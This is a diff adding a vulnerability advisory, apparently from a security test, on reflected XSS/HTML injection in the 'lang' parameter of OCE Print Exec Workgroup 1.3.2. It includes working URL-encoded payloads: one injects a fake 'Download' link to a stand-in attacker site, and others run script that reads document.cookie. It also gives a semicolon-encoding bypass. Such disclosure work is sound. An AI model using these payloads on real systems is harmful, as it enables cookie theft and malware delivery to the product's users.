@@ -1,0 +1,28 @@
+Reflected XSS (Cross-Site Scripting)/HTML Injection
+
+
+Type: Unauthenticated Remote attack
+
+We have identified that "OCE Print Exec Workgroup Version 1.3.2" web interface is vulnerable to XSS/HTMLi attacks. This is due to that the Web App fails to adequately sanitize malicious strings inserted in the "lang" web parameter. This issue affects every web page that contains the "About" link. By leveraging this issue, an attacker is able to cause arbitrary HTML and script code to be executed in a user's browser within the security context of the affected site. This attack can be used in conjunction with a social engineering techniques.
+
+Note that the ";" character is not accepted, but its URL encoded format is accepted. Therefore URL encoding can be used for making the app to accept special characters.
+
+
+
+
+Below evidence is provided.
+
+
+GET Request with HTML Payload. This HTML payload creates a malicious link named "Download" that points to attacker's website. An attacker can trick users into downloading malicious software:
+
+http://172.16.1.150/servlet/PEWGServlet?pag=activation&lang=%27)%22%3C/a%3E%3Ca%20href=%22https://www.attacker-malicious-url.com/malicious-files%22%20style=%22color:%2399cccc%3Btext-decoration:underline%3B%22%3EDownload%3C/a%3E%3Cp%3E%3C/p%3E%3Ca%20%22(%27
+
+
+GET Request with XSS Payload:
+http://172.16.1.150/servlet/PEWGServlet?pag=activation&lang=%27)%22%3C/a%3E%3Cscript%3Ealert(document.cookie)%3B%3C/script%3E%3Ca%3E%22(%27
+
+http://172.16.1.150/servlet/PEWGServlet?pag=activation&lang=%27)%22%3C/a%3E%3Cscript%3Ealert(%27XSS%20by%20Ithaca%27)%3B%3C/script%3E%3Ca%20%22(%27
+
+
+Affected source code:
+<a href="javascript:openURL('/servlet/PEWGServlet?pag=about&lang=')"</a><script>alert('XSS by Ithaca');</script><a "('')" class="banner">About </a>
